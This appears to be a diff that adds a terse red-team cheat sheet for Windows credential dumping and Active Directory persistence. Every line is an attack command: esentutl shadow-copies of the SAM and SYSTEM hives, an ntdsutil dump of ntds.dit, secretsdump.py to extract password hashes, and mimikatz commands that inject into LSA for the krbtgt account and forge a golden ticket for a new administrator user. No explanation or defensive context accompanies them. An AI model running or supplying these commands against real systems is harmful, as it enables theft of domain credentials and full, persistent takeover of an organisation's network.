@@ -1,0 +1,18 @@
+
+--------------------
+
+esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d c:\temp\system
+esentutl.exe /y /vss C:\Windows\System32\config\SAM /d c:\temp\sam
+
+secretsdump.py -sam sam -system system LOCAL
+
+---------------------
+
+powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+
+secretsdump.py -system SYSTEM -security SECURITY -ntds ntds.dit local
+
+-------create fake goldenTicket
+
+lsadump::lsa /inject /name:krbtgt
+mimikatz # kerberos::golden /domain:offense.local /sid:S-1-5-21-4172452648-1021989953-2368502130 /rc4:8584cfccd24f6a7f49ee56355d41bd30 /user:newAdmin /id:500 /ptt
